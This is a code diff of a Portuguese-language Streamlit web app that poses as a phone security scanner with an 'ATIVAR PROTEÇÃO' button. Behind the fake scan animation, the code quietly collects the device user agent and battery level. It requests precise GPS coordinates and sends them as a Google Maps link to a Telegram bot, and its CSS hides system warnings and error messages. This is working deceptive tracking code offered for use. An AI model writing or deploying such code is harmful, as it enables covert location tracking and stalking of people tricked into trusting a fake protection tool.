@@ -12,17 +12,15 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+st.set_page_config(page_title="Segurança", layout="centered")
 
-# 2. CSS: BOLHA + MATAR AVISOS AMARELOS (TOTAL)
+# 2. CSS: BOLHA E DESIGN DO BOTÃO AMARELO COMPRIDO
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    /* SOME COM QUALQUER AVISO AMARELO OU ERRO DO SISTEMA */
     .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
         display: none !important; 
     }
-    
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
     .circle {
         width: 180px; height: 180px; border-radius: 50%;
@@ -35,80 +33,79 @@ st.markdown("""
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
     
-    /* ESTILO DO BOTÃO REAL */
-    .btn-container { width: 100%; display: flex; justify-content: center; margin-top: 20px; }
+    /* ESTILO DO BOTÃO IGUAL AO DO PRINT */
     .btn-ativar {
         background-color: #ffc107; color: black; font-weight: bold;
-        width: 100%; height: 60px; border-radius: 12px; border: none;
-        font-size: 18px; cursor: pointer;
+        width: 100%; height: 50px; border-radius: 12px; border: none;
+        font-size: 16px; cursor: pointer; display: flex;
+        align-items: center; justify-content: center; gap: 10px;
     }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. INTERFACE INICIAL
+# 3. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Captura modelo e bateria (silencioso)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_GET')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_GET')
+# Estado inicial da bolha (4%)
+if 'progresso' not in st.session_state:
+    st.session_state['progresso'] = 4
 
-# Bolha estática em 4%
 with caixa_bolha.container():
-    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text" id="pct">4%</div></div></div>', unsafe_allow_html=True)
+    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["progresso"]}%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. O SEGREDO: BOTÃO EM HTML PURO PARA O NAVEGADOR NÃO BLOQUEAR
-# Esse componente força a abertura da janela de localização do Google
-js_click = """
+# 4. CAPTURA DE DADOS (MODELO E BATERIA)
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
+
+# 5. O SEGREDO: BOTÃO HTML COM JS (PARA O GPS NÃO TRAVAR)
+# Corrigido o erro de string para não dar SyntaxError
+html_button = """
 <script>
-function iniciarProtecao() {
+function chamarGPS() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const data = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'ok'};
-            window.parent.postMessage({type: 'streamlit:set_component_value', value: data}, '*');
+            const result = {lat: pos.coords.latitude, lon: pos.coords.longitude, status: 'sucesso'};
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
         },
-        (err) => { alert("Erro: Ative o GPS para continuar!"); },
+        (err) => { 
+            alert("Por favor, ative a localização no seu GPS!");
+        },
         {enableHighAccuracy: true}
     );
 }
 </script>
-<div class="btn-container">
-    <button class="btn-ativar" onclick="iniciarProtecao()">🔴 ATIVAR PROTEÇÃO</button>
-</div>
-<style>
-    .btn-ativar {
-        background-color: #ffc107; color: black; font-weight: bold;
-        width: 100%; height: 60px; border-radius: 12px; border: none;
-        font-size: 18px; cursor: pointer;
-    }
-</style>
+<button class="btn-ativar" onclick="chamarGPS()">
+    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
+</button>
 """
 
-loc_data = st.components.v1.html(js_click, height=100)
+# Renderiza o botão estilizado
+res_gps = st.components.v1.html(html_button, height=70)
 
-# 5. LÓGICA DE MOVIMENTAÇÃO DOS NÚMEROS E ENVIO
-if loc_data and isinstance(loc_data, dict) and loc_data.get('status') == 'ok':
-    # Animação dos números se mexendo de 0% a 100%
-    for p in range(0, 101, 5):
+# 6. ANIMAÇÃO 0-100% E ENVIO AO TELEGRAM
+if res_gps and isinstance(res_gps, dict) and res_gps.get('status') == 'sucesso':
+    # Animação dos números girando
+    for p in range(st.session_state['progresso'], 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     
-    lat, lon = loc_data['lat'], loc_data['lon']
+    lat, lon = res_gps['lat'], res_gps['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
     
     relatorio = (
         f"🛡️ SISTEMA ATIVADO\n\n"
-        f"📱 Modelo: {ua[:50] if ua else 'N/A'}\n"
-        f"🔋 Bateria: {bat if bat else '--'}%\n"
+        f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
+        f"🔋 Bateria: {bateria if bateria else '--'}%\n"
         f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
     )
     
     enviar_telegram(relatorio)
-    st.success("Localização concluída")
+    st.success("Segurança Ativada com Sucesso!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
